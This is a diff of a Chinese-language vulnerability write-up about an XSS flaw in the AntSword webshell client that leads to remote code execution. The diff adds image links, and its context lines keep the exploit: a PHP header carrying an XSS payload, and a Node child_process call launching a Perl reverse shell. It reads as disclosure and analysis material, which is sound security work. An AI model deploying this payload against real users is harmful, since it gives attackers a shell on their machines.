@@ -9,10 +9,10 @@ AntSword < v2.0.7.1
 ## 漏洞详情
 
 当通过中国蚁剑连接webshell，出现连接失败情况时，中国蚁剑会返回错误信息，如下图：
-![]()
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/AntSword_XSS_RCE/img/1.png)
 
 而该信息并没有进行 XSS 保护，因此能够利用 js 调用 perl 便可反弹攻击者的shell。
-![]()
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/AntSword_XSS_RCE/img/2.png)
 
 ```
 <?php header('HTTP/1.1 500 <img src=# onerror=alert(1)>');
@@ -36,7 +36,7 @@ require('child_process').exec('perl -e \'use Socket;$i="127.0.0.1";$p=1002;socke
 ```
 
 成功反弹攻击者shell：
-![]()
+![](https://github.com/cckuailong/PocCollect/blob/master/Web/AntSword_XSS_RCE/img/3.png)
 
 ## 漏洞修复
 
